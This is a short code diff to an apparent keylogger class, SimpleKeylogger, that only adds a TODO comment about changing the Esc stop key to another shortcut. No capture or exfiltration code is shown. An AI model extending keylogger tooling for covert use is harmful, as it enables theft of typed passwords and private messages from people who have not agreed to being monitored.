@@ -36,7 +36,7 @@ class SimpleKeylogger(KeyloggerInterface):
 
     def on_release(self, key):
         """Callback function for key release event."""
-        if key == keyboard.Key.esc:
+        if key == keyboard.Key.esc: # TODO: change to other keys maybe shortcut
             self.running = False
             return self.running
 
